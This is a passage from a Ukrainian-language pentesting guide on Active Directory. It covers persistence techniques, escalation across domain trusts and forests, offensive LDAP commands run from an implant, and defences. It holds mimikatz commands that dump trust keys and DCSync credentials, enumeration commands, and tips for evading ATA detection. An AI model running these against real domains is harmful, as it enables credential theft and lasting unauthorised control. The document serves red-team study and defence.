**Наявність сертифікатів облікового запису або можливість їх запитувати** — дуже хороший спосіб зберегти персистенцію в обліковому записі користувача (навіть якщо він змінить пароль):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використання сертифікатів також дозволяє зберігати персистенцію з високими привілеями всередині домену:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Об'єкт **AdminSDHolder** в Active Directory забезпечує безпеку **привілейованих груп** (наприклад, Domain Admins та Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих груп, щоб запобігти несанкціонованим змінам. Проте цю функцію можна зловживати: якщо атакуючий змінить ACL AdminSDHolder, надаючи повний доступ звичайному користувачу, цей користувач отримає широке управління всіма привілейованими групами. Цей механізм, який мав би захищати, може працювати протилежно, дозволяючи несанкціонований доступ, якщо за ним не стежать.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

На кожному **Domain Controller (DC)** існує локальний обліковий запис адміністратора. Отримавши admin-права на такій машині, можна витягти hash локального Administrator за допомогою **mimikatz**. Після цього потрібно внести зміни в реєстр, щоб **дозволити використання цього пароля**, що дасть можливість віддаленого доступу до локального Administrator.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **надати** деяким користувачам **спеціальні дозволи** над певними об'єктами домену, які дозволять цьому користувачу **ескалювати привілеї в майбутньому**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **зберігання** **дозволів**, які має **об'єкт**. Якщо ви зможете зробити невелику зміну в **security descriptor** об'єкта, ви зможете отримати дуже цікаві привілеї над цим об'єктом без потреби бути в складі привілейованої групи.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** в пам'яті, щоб встановити **універсальний пароль**, що дає доступ до всіх облікових записів домену.

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити власний **SSP**, щоб **збирати** в **чистому вигляді** облікові дані, які використовуються для доступу до машини.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Реєструє **новий Domain Controller** в AD і використовує його для **протисування атрибутів** (SIDHistory, SPNs...) на вказаних об'єктах **без** залишення логів про **зміни**. Вам потрібні DA привілеї і доступ до **root domain**.\
Зауважте, що якщо використовувати невірні дані, з'являться неприємні логи.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як ескалується привілей, якщо ви маєте **достатні дозволи для читання LAPS паролів**. Проте ці паролі також можна використовувати для **підтримки персистенції**.\
Дивіться:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як межу безпеки. Це означає, що **компрометація одного домену може потенційно призвести до компрометації всього Forest**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, який дозволяє користувачу з одного **домена** отримувати доступ до ресурсів в іншому **домені**. Він створює зв'язок між системами автентифікації двох доменів, дозволяючи перевіркам автентичності проходити між ними. Коли домени налаштовують довіру, вони обмінюються і зберігають певні **ключі** на своїх **Domain Controllers (DCs)**, які важливі для цілісності довіри.

У типовому сценарії, якщо користувач хоче отримати доступ до сервісу в **trusted domain**, спочатку він повинен запросити спеціальний квиток, відомий як **inter-realm TGT**, у DC свого домену. Цей TGT шифрується спільним **ключем**, узгодженим між доменами. Користувач потім пред'являє цей TGT DC **trusted domain**, щоб отримати service ticket (**TGS**). Після успішної валідації inter-realm TGT DC trusted domain видає TGS, що дає користувачу доступ до сервісу.

**Кроки**:

1. **Клієнтська машина** в **Domain 1** починає процес, використовуючи свій **NTLM hash**, щоб запросити **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо клієнт автентифікований успішно.
3. Клієнт потім просить **inter-realm TGT** у DC1, який потрібен для доступу до ресурсів в **Domain 2**.
4. Inter-realm TGT шифрується **trust key**, спільним між DC1 і DC2 як частина двосторонньої domain trust.
5. Клієнт несе inter-realm TGT до **Domain 2's Domain Controller (DC2)**.
6. DC2 перевіряє inter-realm TGT, використовуючи спільний trust key, і, якщо валідно, видає **Ticket Granting Service (TGS)** для сервера в Domain 2, до якого клієнт хоче отримати доступ.
7. Нарешті, клієнт пред'являє цей TGS серверу, який шифрується хешем облікового запису сервера, щоб отримати доступ до сервісу в Domain 2.

### Different trusts

Важливо зауважити, що **довіра може бути односпрямованою або двосторонньою**. У випадку двосторонньої опції обидва домени довіряють один одному, але в **односпрямованій** довірі один домен буде **trusted**, а інший — **trusting**. У останньому випадку **ви зможете доступатися лише до ресурсів всередині trusting домену з trusted домену**.

Якщо Domain A trusts Domain B, то A — trusting domain, а B — trusted domain. Більше того, у **Domain A** це буде **Outbound trust**; а у **Domain B** — **Inbound trust**.

**Різні типи trusting relationships**

- **Parent-Child Trusts**: Звичайна конфігурація в межах того ж forest, де дочірній домен автоматично має двосторонню транзитивну довіру з батьківським доменом. Це означає, що запити автентифікації можуть проходити між батьком і дитиною.
- **Cross-link Trusts**: Називають "shortcut trusts", встановлюються між дочірніми доменами для пришвидшення реферальних процесів. У складних лісах запити на реферальну автентифікацію зазвичай повинні їхати до кореня forest, а потім вниз до цільового домену. Cross-links скорочують цей шлях, що корисно в географічно розподілених середовищах.
- **External Trusts**: Встановлюються між різними, не пов'язаними доменами і за своєю природою не є транзитивними. Згідно з [документацією Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до ресурсів у домені поза поточним forest, який не пов'язаний forest trust. Безпека посилюється через SID filtering при external trusts.
- **Tree-root Trusts**: Ці довіри автоматично встановлюються між forest root доменом і щойно доданим tree root. Хоча зустрічаються не так часто, tree-root trusts важливі для додавання нових дерев доменів до forest, дозволяючи їм зберігати унікальне доменне ім'я і забезпечуючи двосторонню транзитивність. Детальніше в [посібнику Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Тип довіри двосторонній та транзитивний між двома forest root доменами, також застосовується SID filtering для посилення безпеки.
- **MIT Trusts**: Встановлюються з не-Windows, [RFC4120‑сумісними](https://tools.ietf.org/html/rfc4120) Kerberos доменами. MIT trusts більш спеціалізовані і призначені для інтеграції з Kerberos-системами поза Windows екосистемою.

#### Інші відмінності в **trusting relationships**

- Відносини довіри можуть бути **транзитивними** (A довіряє B, B довіряє C, отже A довіряє C) або **нетранзитивними**.
- Відносини довіри можуть бути **обопільними** (обидва довіряють один одному) або **односпрямованими** (тільки один довіряє іншому).

### Attack Path

1. **Перелічити** trusting relationships
2. Перевірити, чи будь-який **security principal** (user/group/computer) має **доступ** до ресурсів **іншого домену**, можливо через ACE entries або шляхом членства в групах іншого домену. Шукайте **зв'язки між доменами** (довіра була створена саме для цього, ймовірно).
2. kerberoast в цьому випадку може бути ще однією опцією.
3. **Скомпрометувати** облікові записи, які можуть **пивотити** через домени.

Атакуючі можуть отримати доступ до ресурсів в іншому домені трьома основними механізмами:

- **Local Group Membership**: Принципали можуть бути додані до локальних груп на машинах, наприклад до групи “Administrators” на сервері, що дає їм значний контроль над тією машиною.
- **Foreign Domain Group Membership**: Принципали також можуть бути членами груп у зовнішньому домені. Однак ефективність цього залежить від характеру довіри і області дії групи.
- **Access Control Lists (ACLs)**: Принципали можуть бути вказані в **ACL**, особливо як сутності в **ACEs** в **DACL**, надаючи їм доступ до конкретних ресурсів. Для тих, хто хоче глибше розібратися в механіці ACLs, DACLs і ACEs, білет "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" є безцінним ресурсом.

### Find external users/groups with permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у домені. Це будуть користувачі/групи з **зовнішнього домену/forest**.

Ви можете перевірити це в **Bloodhound** або використовуючи powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахувати доменні довіри:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існує **2 trusted keys**, одна для _Child --> Parent_ та інша для _Parent_ --> _Child_.\
> Ви можете переглянути ключ, який використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ескалація до Enterprise admin у child/parent домені, зловживаючи довірою через SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Розуміння того, як можна експлуатувати Configuration Naming Context (NC), є критично важливим. Configuration NC слугує центральним репозиторієм для даних конфігурації по всьому forest в середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у forest, при цьому записувані DC зберігають записувану копію Configuration NC. Для експлуатації цього потрібно мати **SYSTEM privileges on a DC**, бажано на child DC.

**Link GPO to root DC site**

Контейнер Sites Configuration NC містить інформацію про сайти всіх комп'ютерів, приєднаних до домену, у AD forest. Маючи SYSTEM privileges на будь-якому DC, атакуючі можуть зв'язати GPOs з root DC sites. Це може скомпрометувати root domain шляхом маніпуляції політиками, застосованими до цих сайтів.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Вектор атаки включає націлювання на привілейовані gMSAs в домені. KDS Root key, який необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь-якому DC, можна отримати доступ до KDS Root key і обчислити паролі для будь-якого gMSA по всьому forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Цей метод вимагає терпіння та очікування створення нових привілейованих AD об'єктів. Маючи SYSTEM privileges, атакуючий може змінити AD Schema, щоб надати будь-якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над щойно створеними AD об'єктами.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Вразливість ADCS ESC5 націлена на контроль над об'єктами Public Key Infrastructure (PKI) для створення шаблону сертифіката, який дозволяє автентифікуватися як будь-який користувач у forest. Оскільки PKI об'єкти розміщуються в Configuration NC, компрометація записуваного child DC дозволяє виконати ESC5 атаки.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). У сценаріях без ADCS атакуючий має можливість налаштувати необхідні компоненти, як обговорюється в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Зовнішній домен лісу — односпрямований (вхідний) або двосторонній
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **зовнішній домен довіряє вашому домену**, надаючи вам **невизначені повноваження** над ним. Вам потрібно з'ясувати, **які об'єкти безпеки вашого домену мають який доступ до зовнішнього домену**, а потім спробувати це експлуатувати:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній лісовий домен — односторонній (вихідний)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **ваш домен** довіряє деякі **привілеї** обліковому запису з **іншого домену**.

Однак, коли **домен стає довіреним** для довіряючого домену, довірений домен **створює користувача** з **передбачуваною назвою**, який використовує як **пароль — довірений пароль**. Це означає, що можливо **доступитися до користувача з довіряючого домену, щоб проникнути в довірений домен**, перелічити його ресурси та спробувати ескалувати додаткові привілеї:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб компрометації довіреного домену — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **протилежному напрямку** довірчих відносин домену (що трапляється не дуже часто).

Ще один спосіб компрометації довіреного домену — зачекати на машині, куди **користувач з довіреного домену може підключитися** через **RDP**. Тоді атакуючий може інжектувати код у процес RDP-сесії та **звідти отримати доступ до домену походження жертви**.\
Крім того, якщо **жертва підключила свій жорсткий диск**, з процесу **RDP session** атакуючий може записати **backdoors** у **папку автозавантаження жорсткого диска**. Ця техніка називається **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Пом'якшення зловживань довірчими відносинами домену

### **SID Filtering:**

- Ризик атак, що використовують атрибут SID history через forest trusts, зменшується завдяки SID Filtering, який за замовчуванням увімкнений для всіх inter-forest trusts. Це ґрунтується на припущенні, що intra-forest trusts є безпечними, оскільки Microsoft розглядає ліс (forest), а не домен, як межу безпеки.
- Проте є нюанс: SID filtering може порушити роботу застосунків і доступ користувачів, через що його іноді відключають.

### **Selective Authentication:**

- Для inter-forest trusts застосування Selective Authentication гарантує, що користувачі з обох лісів не автентифікуються автоматично. Натомість потрібні явні дозволи, щоб користувачі могли отримати доступ до доменів і серверів у довіряючому домені або лісі.
- Важливо зауважити, що ці заходи не захищають від експлуатації записуваного Configuration Naming Context (NC) або атак на trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) повторно реалізує bloodyAD-style LDAP primitives як x64 Beacon Object Files, що виконуються повністю всередині on-host implant (наприклад, Adaptix C2). Оператори збирають пакет командою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` з beacon. Увесь трафік використовує контекст безпеки поточного входу через LDAP (389) із signing/sealing або LDAPS (636) з автоматичною довірою сертифіката, тому не потрібні socks proxies або артефакти на диску.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, та `get-groupmembers` перетворюють короткі імена/шляхи OU у повні DN і вивантажують відповідні об'єкти.
- `get-object`, `get-attribute`, та `get-domaininfo` витягують довільні атрибути (включаючи security descriptors) та метадані лісу/домену з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, та `get-rbcd` виявляють roasting candidates, налаштування делегації та існуючі [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors безпосередньо з LDAP.
- `get-acl` та `get-writable --detailed` аналізують DACL, щоб перелічити trustees, права (GenericAll/WriteDACL/WriteOwner/attribute writes) та наслідування, даючи негайні цілі для ескалації привілеїв через ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP примітиви запису для escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) дозволяють оператору підготувати нові principals або машинні облікові записи в будь-яких OU, де є відповідні права. `add-groupmember`, `set-password`, `add-attribute` та `set-attribute` безпосередньо захоплюють цілі після отримання прав write-property.
- ACL-орієнтовані команди, такі як `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` та `add-dcsync`, перетворюють WriteDACL/WriteOwner на будь-якому AD-об'єкті у скидання паролів, контроль членства в групах або привілеї DCSync без залишення PowerShell/ADSI артефактів. Відповідні `remove-*` команди очищають інжектовані ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача Kerberoastable; `add-asreproastable` (UAC toggle) позначає його для AS-REP roasting без зміни пароля.
- Делегаційні макроси (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, UAC-флаги або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon-а, дозволяючи шляхи атак constrained/unconstrained/RBCD та усуваючи потребу в віддаленому PowerShell або RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` інжектить привілейовані SIDs у SID history контрольованого principal (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп'ютерів або користувачів, дозволяючи нападникові перемістити активи в OUs, де вже існують делеговані права, перед використанням `set-password`, `add-groupmember` або `add-spn`.
- Тісно орієнтовані команди видалення (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дозволяють швидко відкотити зміни після того, як оператор зібрав облікові дані або встановив персистенс, мінімізуючи телеметрію.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Рекомендується дозволяти Domain Admins входити лише на Domain Controllers, уникаючи їх використання на інших хостах.
- **Service Account Privileges**: Сервіси не повинні запускатися з привілеями Domain Admin (DA) для збереження безпеки.
- **Temporal Privilege Limitation**: Для задач, що вимагають привілеїв DA, слід обмежувати їх тривалість. Це можна зробити за допомогою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Аудит Event ID 2889/3074/3075, а потім примусове застосування LDAP signing та LDAPS channel binding на DCs/клієнтах для блокування LDAP MITM/relay атак.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Реалізація deception включає встановлення пасток, наприклад decoy users або computers, з атрибутами, такими як паролі, що не зникають, або позначені як Trusted for Delegation. Детальний підхід включає створення користувачів з певними правами або додавання їх до груп з високими привілеями.
- Практичний приклад: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше про розгортання deception techniques можна знайти за посиланням [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Підозрілі індикатори включають нетиповий ObjectSID, рідкі входи в систему, дати створення та низьку кількість невдалих спроб введення пароля.
- **General Indicators**: Порівняння атрибутів потенційних decoy-об'єктів з реальними може виявити невідповідності. Інструменти, такі як [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster), можуть допомогти в ідентифікації таких deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
  - **User Enumeration**: Уникання сесійного enumeration на Domain Controllers, щоб запобігти виявленню ATA.
  - **Ticket Impersonation**: Використання **aes** ключів для створення квитків допомагає уникнути виявлення, не понижуючи до NTLM.
  - **DCSync Attacks**: Рекомендується виконувати з не-Domain Controller, щоб уникнути виявлення ATA, оскільки пряме виконання з Domain Controller викличе сповіщення.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
